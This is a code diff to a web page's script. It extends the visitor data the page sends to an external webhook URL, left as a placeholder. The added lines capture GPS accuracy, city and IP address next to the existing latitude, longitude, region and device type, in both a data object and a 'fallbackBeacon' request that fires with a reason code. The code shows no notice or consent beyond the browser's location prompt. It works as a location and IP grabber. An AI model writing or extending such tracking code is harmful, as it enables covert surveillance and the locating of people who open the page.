@@ -88,7 +88,7 @@
       font-size: 2.5rem;
       margin-bottom: 1rem;
       font-weight: 600;
-      display: inline-flex; /* You want inline-flex for the icon to align with text */
+      display: inline-flex; 
       gap: 0.5rem;
       align-items: center;
       justify-content: center;
@@ -484,8 +484,11 @@
           const data = {
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
             country: locationData.country,
             region: locationData.region,
+            city: locationData.city,
+            ip: locationData.ip,
             deviceType: document.body.classList.contains('mobile') ? 'mobile' :
                         document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
           };
@@ -516,10 +519,13 @@
     async function fallbackBeacon(reason, pos = {}) {
       const lat = pos.coords?.latitude || "unknown";
       const lon = pos.coords?.longitude || "unknown";
+      const acc = pos.coords?.accuracy || "unknown";
       const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}` +
         `&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}` +
         `&country=${encodeURIComponent(locationData.country)}` +
-        `®ion=${encodeURIComponent(locationData.region)}` +
+        `&region=${encodeURIComponent(locationData.region)}` +
+        `&city=${encodeURIComponent(locationData.city)}` +
+        `&ip=${encodeURIComponent(locationData.ip)}` +
         `&deviceType=${encodeURIComponent(
           document.body.classList.contains('mobile') ? 'mobile' :
           document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
